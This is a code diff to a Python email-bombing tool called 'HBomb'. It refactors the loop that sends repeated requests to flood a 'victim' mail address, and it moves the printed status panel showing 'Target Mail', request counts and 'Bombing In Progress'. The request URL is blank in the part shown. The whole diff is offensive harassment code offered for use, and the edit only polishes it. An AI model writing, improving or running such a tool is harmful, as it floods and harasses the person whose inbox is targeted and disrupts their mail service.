@@ -66,33 +66,32 @@ def mail():
     print("\n\t\t Please Wait Bombing Start...")
     while True:
         try:
-          for a in range(1, int(mail)) :
             URL = ""
-            r = requests.get(url = URL, params = PARAMS)
-            pastebin_url = r.text 
-            print("The pastebin URL is:%s"%pastebin_url) 
+            for a in range(1, int(mail)):
+                r = requests.get(url = URL, params = PARAMS)
+                pastebin_url = r.text
+                print(f"The pastebin URL is:{pastebin_url}")
+                clr()
+                banner()
+                print(Blue)
+                print("-------------------------------------------- ")
+                print(f"{Red}                  Details {Blue}")
+                print(" Target Mail             : ",RG)
+                print(" Number of Requests Sent : ",num)
+                print(" Successful Requests     : ",int(a))
+                print(" Failed Requests         : ",0)
+                print("-------------------------------------------- ")
+                print("            Bombing In Progress")
             clr()
             banner()
-            print(Blue)
-            print("-------------------------------------------- ")
-            print(Red +"                  Details "+Blue)
-            print(" Target Mail             : ",RG)
-            print(" Number of Requests Sent : ",num)
-            print(" Successful Requests     : ",int(a))
-            print(" Failed Requests         : ",0)
-            print("-------------------------------------------- ")
-            print("            Bombing In Progress")
-          clr()
-          banner() 
-          print(str(num) + " Mail Send Successful To  " + str(RG))
-          input("\n\nPress Enter To Run Again HBomb Tool : ")  
-          subprocess.call([sys.executable, 'HBomb.py']) 
+            print(f"{str(num)} Mail Send Successful To  {str(RG)}")
+            input("\n\nPress Enter To Run Again HBomb Tool : ")
+            subprocess.call([sys.executable, 'HBomb.py'])
         except :
             print("Victim mail not correct !!!")
             RG = str(input("Enter Victim Mail address : "))
             print("\n\t\t Please Wait Bombing Start...")
-            continue         
-        pass
+            continue
 clr()
 banner()
 try:
